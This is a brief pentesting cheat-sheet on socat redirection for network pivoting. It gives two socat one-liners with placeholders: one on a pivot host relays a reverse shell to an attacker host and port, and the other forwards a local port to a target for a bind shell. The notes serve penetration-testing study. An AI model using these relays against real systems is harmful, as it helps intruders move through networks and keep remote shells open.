# Socat Redirection

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels *without needing to use SSH tunneling*.

It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.

## Redirection with a Reverse Shell

On the pivot, we can enable redirection from the pivot on `pivot-port` to the `attacker-host` on `attacker-port`:

```shell
socat TCP4-LISTEN:<pivot-port>,fork TCP4:<attacker-host>:<attacker-port>
```

We can then use the pivot to start a reverse shell.

## Redirection with a Bind Shell

Well, it's pretty much the same as with a reverse shell, but reversed:

```shell
socat TCP4-LISTEN:<local-port>,fork TCP4:<target-host>:<target-port>
```
